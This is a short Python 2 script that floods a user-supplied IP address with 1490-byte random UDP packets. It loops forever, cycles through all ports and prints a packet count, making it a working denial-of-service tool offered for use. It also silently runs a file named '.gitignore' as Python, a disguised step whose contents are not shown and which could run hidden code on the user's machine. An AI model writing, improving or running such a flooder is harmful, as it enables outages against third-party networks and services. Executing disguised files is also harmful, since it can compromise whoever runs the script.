import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("sleep 0.7")
print
ip = raw_input("Enter IP Target : ")
port = input("Enter Port : ")
print

os.system('echo -en "\033[?25l"')
os.system("python .gitignore")
os.system('echo -en "\033[?12l\033[?25h"')

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
